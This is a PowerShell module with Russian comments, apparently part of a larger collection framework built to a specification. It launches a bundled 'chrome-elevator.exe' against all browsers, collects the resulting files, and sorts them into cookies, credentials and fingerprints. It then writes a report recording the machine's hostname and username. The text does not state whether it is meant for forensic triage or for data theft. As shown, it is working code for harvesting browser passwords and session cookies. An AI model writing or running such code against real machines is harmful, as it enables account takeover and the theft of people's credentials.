param([string]$OutputPath)
$ErrorActionPreference = "Stop"

# chrome-elevator лежит рядом с скриптом согласно структуре ТЗ (4.2)
$chromeElevExe = Join-Path $PSScriptRoot "chrome-elevator.exe"
if (-not (Test-Path $chromeElevExe)) {
    throw "chrome-elevator.exe not found in module directory"
}

# Временная директория для работы утилиты (чтобы не ломать структуру OutputPath)
$workDir = Join-Path $OutputPath "_temp_work"
New-Item -Path $workDir -ItemType Directory -Force | Out-Null

function Save-JsonNoBom {
    param([object]$Data, [string]$Path)
    $json = $Data | ConvertTo-Json -Depth 5
    $utf8 = New-Object System.Text.UTF8Encoding($false)
    [System.IO.File]::WriteAllText($Path, $json, $utf8)
}

try {
    Write-Host "[browser] Starting chrome-elevator..." -ForegroundColor Gray
    
    # Запуск с флагами: все браузеры, без шума, вывод в workDir
    $process = Start-Process -FilePath $chromeElevExe `
        -ArgumentList @("-o", $workDir, "all") `
        -Wait -PassThru -NoNewWindow

    if ($process.ExitCode -ne 0) {
        throw "chrome-elevator exited with code $($process.ExitCode)"
    }

    # Сбор артефактов из временной папки
    $artifacts = @()
    $resultFiles = Get-ChildItem -Path $workDir -Recurse -File | Where-Object {
        $_.Extension -in @('.json', '.txt', '.log')
    }

    foreach ($file in $resultFiles) {
        $relPath = $file.FullName.Replace($workDir, "").TrimStart("\")
        $destDir = Join-Path $OutputPath (Split-Path $relPath -Parent)
        if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
        
        Move-Item -Path $file.FullName -Destination $destDir -Force
        
        $artifacts += @{
            filename    = $file.Name
            archive_path = "browser/$relPath"
            size_bytes  = $file.Length
            type        = switch -Regex ($file.Name) {
                "cookie"       { "cookies" }
                "password|login"{ "credentials" }
                "fingerprint"  { "fingerprint" }
                default        { "unknown" }
            }
        }
    }

    # Формирование отчёта в формате ТЗ (10.2)
    $report = [PSCustomObject]@{
        metadata = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            timestamp = (Get-Date).ToString("o")
            module = "browser"
        }
        execution = @{
            exit_code = $process.ExitCode
            success = ($process.ExitCode -eq 0)
            duration_sec = [math]::Round((New-TimeSpan -Start $process.StartTime -End $process.ExitTime).TotalSeconds, 1)
        }
        artifacts = $artifacts
    }

    Save-JsonNoBom -Data $report -Path (Join-Path $OutputPath "browser_report.json")
    Write-Host "[browser] Collected $($artifacts.Count) artifacts" -ForegroundColor Green

} finally {
    # Очистка временных данных
    if (Test-Path $workDir) {
        Remove-Item -Path $workDir -Recurse -Force -ErrorAction SilentlyContinue
    }
}
